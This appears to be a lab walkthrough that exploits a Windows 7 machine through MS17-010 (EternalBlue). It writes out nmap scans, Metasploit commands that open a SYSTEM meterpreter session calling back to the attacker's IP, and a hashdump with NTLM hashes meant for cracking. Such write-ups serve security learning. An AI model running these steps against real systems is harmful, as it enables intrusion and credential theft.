<hr style="border-color:red;"><h1 align="center"><img src="https://github.com/user-attachments/assets/db0ff09d-a6b7-4b03-8f93-1c1827dc7867"></h1>

<hr style="border-color:red;"><h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1><hr style="border-color:red;">

### **- Verifying the connectivity of the discovered device:**

```bash
ping -c 1 10.10.12.63
```
```bash
ping
The ping command is used to check network connectivity between your machine and another device by sending ICMP (Internet Control Message Protocol) echo request packets.
-c 1
The -c flag specifies the number of echo request packets to send. In this case, -c 1 means only one packet will be sent.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7b3d2ea0-61a7-4511-8088-dea75395c71a"></picture><br>TTL = 127 ==> WINDOWS</h3><hr style="border-color:red;">

### **- Scanning of the discovered device to find all open ports to find possible access routes:**

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.12.63 -oG allPorts
```
```
-p-
This tells Nmap to scan all 65535 TCP ports (from 0 to 65535). By default, Nmap only scans the most common 1,000 ports.

--open
This filters the results to only show open ports, ignoring closed or filtered ports.

-sS
This specifies a SYN scan (also called a half-open scan or stealth scan).
Instead of fully establishing a TCP connection, Nmap sends an SYN packet and waits for a response.
If the target responds with SYN-ACK, it means the port is open.
If the target responds with RST, the port is closed.
If no response or an ICMP error is received, the port may be filtered (firewall blocking it).

--min-rate 5000
This forces Nmap to send at least 5000 packets per second, making the scan faster.
Without this, Nmap adjusts the speed automatically based on network conditions.

-vvv
This increases verbosity level (very very verbose).
It provides real-time feedback while scanning.
You will see results as they are discovered instead of waiting for the full scan to complete.

-n
This disables DNS resolution, making the scan faster.
By default, Nmap tries to resolve IPs to hostnames, which can slow down the scan.

-Pn
This tells Nmap to skip the host discovery phase and assume the target is up.
Normally, Nmap pings the target first to check if it is online.
If a firewall is blocking pings, this option is useful to force a scan even if the target doesn’t respond to pings.

-oG allPorts
This tells Nmap to output the results in "Grepable" format and save them in a file called allPorts.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/14e953a0-650c-4e09-9532-d084c7761ce7"></picture><br>Accessible ports 135,139,445,3389,49452,49152,49154,49158,49160</h3><hr style="border-color:red;">

### **- Analysis of the open ports found on the discovered device to get more information on the services running on those ports:**

```bash
nmap -sCV -p135,139,445,3389,49452,49152,49154,49158,49160 10.10.12.63 -oN targeted
```
```
-sC
Enables Nmap’s default script scanning.
This runs a set of default scripts to gather more information about detected services.
Scripts can detect vulnerabilities, enumerate software versions, and check for misconfigurations.
Equivalent to --script=default.

-sV
Performs version detection of services.
It tries to determine the exact software version running on open ports.

-p
This makes the scan faster and more targeted instead of scanning all ports.

-oN targeted
Saves the output in normal format to a file named targeted.
You can later review this file for findings.
```
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/67ace266-1259-4839-b491-fac72e358c27"></picture><br>445/tcp   open   microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) "could be vulnerable to EternalBlue"</h3><hr style="border-color:red;">

### **- Looking for vulnerabilities with nmap:**
```bash
nmap --script "vuln and safe" -p445 10.10.12.63
```
```
--script "vuln and safe" → Runs Nmap scripts that belong to both the vuln (vulnerability detection) and safe (non-destructive) categories.

-p445 → Specifies scanning only port 445 (SMB/Windows file sharing).
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e1883661-9019-48d0-a24f-718440cc2987"></picture><br>We found ms17-010 Vulnerability</h3><hr style="border-color:red;">

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1><hr style="border-color:red;">

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 445</h2>

### **Scanning ms17-010 whit METASPLOIT for possible vulnerabilities**
```bash
msfdb init && msfconsole
```
```
msfdb init (Initialize Metasploit Database)
msfconsole (Launch Metasploit Console)
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d30ca4a3-673b-4644-8057-70dce9a04494"></picture><br>In here we will look for a vulnerability for ms17-010</h3>

```bash
search ms17-010
```

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7d22d9ff-cf8f-49ec-a4b4-bdd612605964"></picture><br>As we thought it was an eternalblue.</h3>


### **- We will configure our sploit to gain access to the victim machine:**

```bash
use 0
show options
```

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/eb010bfc-605e-4753-9bdc-a5a44c50d0ae"></picture><br>The sploit is asking us to enter information about the victim and attacker ip since the ports are automatically assigned.</h3>

### **- We assign the information you require:**
```bash
set RHOSTS 10.10.12.63
set LHOST 10.21.118.81
run
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a0d1071b-0d56-46bc-87eb-4b67fea89c95"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1573f02f-7934-4fb1-b381-a901d02f1926"></picture><br>we already have a session by meterpreter like user System.</h3>

### **- e search for all hashes in the system**
```bash
hashdump
```
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/82b66b35-dfed-4191-98f1-55ea6c1968b6"></picture><br>Using the web https://crackstation.net/ we will break these hashes</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/739058b1-6131-4368-81e1-c3f7d3760145"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/9d38f110-d603-4b26-947d-5af09520ff2f"></picture><br></h3>
